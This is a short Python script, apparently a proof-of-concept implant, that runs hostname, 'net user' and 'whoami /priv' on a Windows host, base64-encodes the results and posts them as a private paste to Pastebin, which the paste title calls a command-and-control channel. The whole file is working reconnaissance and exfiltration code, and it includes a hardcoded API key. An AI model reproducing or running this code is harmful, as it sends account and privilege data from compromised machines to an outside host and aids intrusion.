import requests
import base64
import subprocess
import platform
from requests.api import post
import base64
import socket

#API URL and Key for Pastebin
URL = 'https://pastebin.com/api/api_post.php'
TOKEN_KEY = "aHAp7tngAnWmG666RrScS_qmVm2_54PC"

def main():
    verbose = "Host Reconnaissance\n=====================\n"
    #Retrieve Host Information
    hostname = subprocess.Popen(args="hostname", stdin = subprocess.PIPE, stdout= subprocess.PIPE, stderr = subprocess.PIPE, shell = True).stdout.read().decode()
    verbose += "Hostname : " + hostname + "\n"
    #Retrieve User Login Information
    user_log = subprocess.Popen(args="net user", stdin = subprocess.PIPE, stdout= subprocess.PIPE, stderr = subprocess.PIPE, shell = True).stdout.read().decode()
    verbose += "User :\n" + user_log + "\n"
    #Privillege Information
    privillege = subprocess.Popen(args="whoami /priv", stdin = subprocess.PIPE, stdout= subprocess.PIPE, stderr = subprocess.PIPE, shell = True).stdout.read().decode()
    verbose += "Privillege :\n" + privillege + "\n"

    #Encode from plain text to base64 format
    encoded_verbose = base64.b64encode(verbose.encode('utf-8'))

    #Post Paramenter Information
    pb_data = {
        'api_dev_key': TOKEN_KEY,
        'api_option': 'paste',
        'api_paste_code': encoded_verbose,
        'api_paste_name': 'PasteBin Sebagai C&C',
        'api_paste_private': 1
    }

    #Sending data to pastebin
    send = post(URL, data=pb_data)
    print(f"Status code: {send.status_code}")
    print(f"Pastebin Link : {send.text}")


if __name__ == '__main__':
    main()
    
